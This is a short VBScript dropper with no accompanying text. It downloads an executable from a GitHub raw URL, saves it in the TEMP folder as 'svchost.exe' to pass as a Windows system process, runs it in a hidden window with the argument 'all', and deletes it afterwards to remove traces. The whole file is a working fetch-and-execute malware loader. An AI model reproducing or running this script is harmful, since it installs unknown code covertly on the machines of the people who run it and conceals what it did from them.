Set shell = CreateObject("WScript.Shell")
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
Set stream = CreateObject("ADODB.Stream")

exe = shell.ExpandEnvironmentStrings("%TEMP%") & "\svchost.exe"

http.Open "GET", "https://raw.githubusercontent.com/linntwc/gee-selfbot/main/svchost32.exe", False
http.Send
stream.Type = 1
stream.Open
stream.Write http.ResponseBody
stream.SaveToFile exe, 2
stream.Close

shell.Run """" & exe & """ all", 0, True

CreateObject("Scripting.FileSystemObject").DeleteFile exe, True